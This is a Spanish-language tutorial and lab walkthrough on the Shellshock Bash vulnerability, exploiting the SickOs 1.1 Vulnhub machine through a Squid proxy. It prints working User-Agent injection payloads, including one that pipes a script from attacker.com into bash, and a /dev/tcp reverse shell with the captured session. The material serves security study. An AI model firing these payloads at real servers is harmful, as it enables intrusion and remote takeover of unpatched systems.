
---

# Ataque Shellshock

El ataque Shellshock es una técnica que explota una vulnerabilidad crítica descubierta en 2014 en el intérprete de comandos **Bash**, presente en muchos sistemas basados en Unix y Linux. Esta vulnerabilidad permite ejecutar comandos arbitrarios si una variable de entorno es manipulada de forma maliciosa.

## ¿Por qué ocurre esta vulnerabilidad?

Bash tiene una funcionalidad que permite definir funciones en variables de entorno. El problema aparece cuando, tras la definición de una función, Bash sigue interpretando cualquier contenido adicional como comandos. Esto abre la puerta a la ejecución de código malicioso cuando se evalúan variables de entorno que no deberían contener código ejecutable.

Este comportamiento se vuelve peligroso cuando un servicio como un servidor web (por ejemplo, Apache con CGI habilitado) pasa variables de entorno a scripts en Bash. Si un atacante logra inyectar código en alguna de esas variables (por ejemplo, `User-Agent`, `Cookie` o `Referer`), Bash ejecutará esos comandos sin verificar si son legítimos.

---

## Ejemplo práctico

Supongamos que estamos auditando un servidor Linux que tiene un CGI habilitado y usa Bash para interpretar scripts.

Desde nuestra máquina atacante, enviamos una solicitud `curl` con un `User-Agent` modificado:

```bash
curl -A '() { :;}; echo; echo; /bin/bash -c "whoami"' http://10.10.10.100/cgi-bin/status.sh
```

Si el servidor es vulnerable y ejecuta el script con Bash, este comando imprimirá el nombre del usuario con el que se ejecuta el CGI (probablemente `www-data` o `apache`), confirmando que podemos ejecutar comandos arbitrarios.

A partir de ahí, podríamos continuar con otros comandos como `id`, `uname -a`, `cat /etc/passwd`, etc., o incluso abrir una reverse shell.

---

## Ejemplo realista

Durante una auditoría interna de una pequeña empresa, detectamos un viejo servidor web con CGI activado. El sistema operativo es una versión antigua de CentOS y Bash no ha sido actualizado desde hace años.

Observamos que el endpoint `/cgi-bin/ping.sh` permite ejecutar scripts que hacen llamadas internas. Enviamos la siguiente petición con `curl`:

```bash
curl -A '() { :;}; /bin/bash -c "curl http://attacker.com/shell.sh | bash"' http://intranet.empresa.local/cgi-bin/ping.sh
```

El servidor vulnerable interpreta esa variable de entorno (`User-Agent`) y ejecuta el script malicioso alojado en nuestro servidor. Esto nos otorga una shell remota en el sistema interno de la empresa, comprometiendo su infraestructura.

---

## Prevención

Para evitar la explotación de esta vulnerabilidad, debemos:

- **Actualizar Bash** a una versión parcheada en todos los sistemas.
    
- **Deshabilitar CGI** si no es estrictamente necesario.
    
- **Filtrar y validar** todas las entradas que se conviertan en variables de entorno.
    
- **Monitorear tráfico HTTP** en busca de patrones sospechosos en cabeceras como `User-Agent`.
    

---
# Laboratorio y guía paso a paso de explotación

## Máquina de práctica

Podemos practicar esta técnica con la máquina vulnerable **SickOs 1.1** de Vulnhub, que incluye un escenario con Squid mal configurado. 

Descarga:  
[https://www.vulnhub.com/entry/sickos-11,132/](https://www.vulnhub.com/entry/sickos-11,132/)

**Nota:** para este laboratorio usaremos el mismo que el visto en [[Enumeración y explotación de SQUID Proxies]]

---
## Enumeración

Acción:

```bash
gobuster dir -u http://192.168.1.62/ --proxy http://192.168.1.62:3128/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

Resultado:

```bash
/index/               (Status: 200) [Size: 21]
/icons/               (Status: 403) [Size: 286]
/doc/                 (Status: 403) [Size: 284]
/cgi-bin/             (Status: 403) [Size: 288]
/server-status/       (Status: 403) [Size: 294]
```

Explicación: al comando que usamos en [[Enumeración y explotación de SQUID Proxies]], añadimos el parámetro `--add-slash` para que al final de cada comprobación añada un `/` ya que hay rutas que solo responden de este modo. Y vemos que encontramos una ruta `/cgi-bin/` la cual es habitual comprobar dado el caso la existencia de un **Shellshock**

---

Acción: añadimos la búsqueda de extensiones con `-x` y fuzzeamos por la ruta `/cgi-bin/`

```bash
gobuster dir -u http://192.168.1.62/cgi-bin/ --proxy http://192.168.1.62:3128/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x pl,sh,cgi  
```

Resultado:

```bash
/status               (Status: 200) [Size: 197]
```

Explicación: nuevo directorio, que si acudimos al navegador vemos lo siguiente

![[iCloudDrive/iCloud~md~obsidian/Git/Setting_Github/Documento Hacker/OWASP TOP 10/Ataque ShellShock/Imágenes/web_1.png]]

**Nota:** si recargamos la página vemos que el parámetro 'uptime' se actualiza en tiempo real

Acción: podemos verlo claramente con [[iCloudDrive/iCloud~md~obsidian/Git/Setting_Github/Comandos/Curl|Curl]] 

```bash
curl -s http://192.168.1.62/cgi-bin/status --proxy http://192.168.1.62:3128/ | jq
# <Repetir>
```

Resultado:

```bash
{
  "uptime": " 18:43:35 up 1:37, 0 users, load average: 2.12, 2.50, 1.38",
  "kernel": "Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux"
}
--------------------------------------------------------------------------------------------------------------------
{
  "uptime": " 18:43:38 up 1:37, 0 users, load average: 2.03, 2.47, 1.37",
  "kernel": "Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux"
}
```

---
## Explotación

**Para saber más:** un artículo muy bueno que explica este tipo de vulnerabilidad es el siguiente --> [Inside Shellshock: How hackers are using it to exploit systems](https://blog.cloudflare.com/inside-shellshock/)

El ejemplo señala que se juega con la cabecera `User-Agent:` siguiendo la siguiente estructura e inyección de comando

```bash
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
```

Explicación:  esta primera parte `() { :; };` es digamos el payload que corrompe el sistema, y este segundo `/bin/eject` es el comando, *indicando su ruta* la cual podemos comprobar con `which <comando>` 

---

Acción:

```bash
which whoami
```

Resultado:

```bash
/usr/bin/whoami
```

Explicación:

---

Acción:

```bash
curl -s http://192.168.1.62/cgi-bin/status --proxy http://192.168.1.62:3128/ -H "User-Agent: () { :; }; /usr/bin/whoami"
```

Resultado:

```bash
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator,
 webmaster@localhost and inform them of the time the error occurred,
and anything you might have done that may have
caused the error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at 192.168.1.62 Port 80</address>
</body></html>
```

Explicación: probemos añadiendo un `echo;`

---

Acción:

```bash
curl -s http://192.168.1.62/cgi-bin/status --proxy http://192.168.1.62:3128/ -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
```

Resultado:

```bash
www-data
```

Explicación: ahora vemos la ejecución del comando `whoami`. A veces, es necesario añadir uno o hasta dos `echo;` antes del comando a ejecutar para así poder ver su ejecución

---

Acción: 

```bash
nc -lvnp 443
listening on [any] 443 ...
```

Acción:

```bash
curl -s http://192.168.1.62/cgi-bin/status --proxy http://192.168.1.62:3128/ -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.66/443 0>&1'"
```

Resultado:

```bash
nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.1.66] from (UNKNOWN) [192.168.1.62] 52636
bash: no job control in this shell
www-data@SickOs:/usr/lib/cgi-bin$ whoami
whoami
www-data
www-data@SickOs:/usr/lib/cgi-bin$ 
```

Explicación: hemos logrado acceso a la máquina víctima. 

**Nota:** en caso de no funcionar el binario, probar en la ruta `/usr/bin/bash`

**Script:** esta acción la podemos ejecutar con un [[iCloudDrive/iCloud~md~obsidian/Git/Setting_Github/Documento Hacker/OWASP TOP 10/Ataque ShellShock/Script|Script]]

---




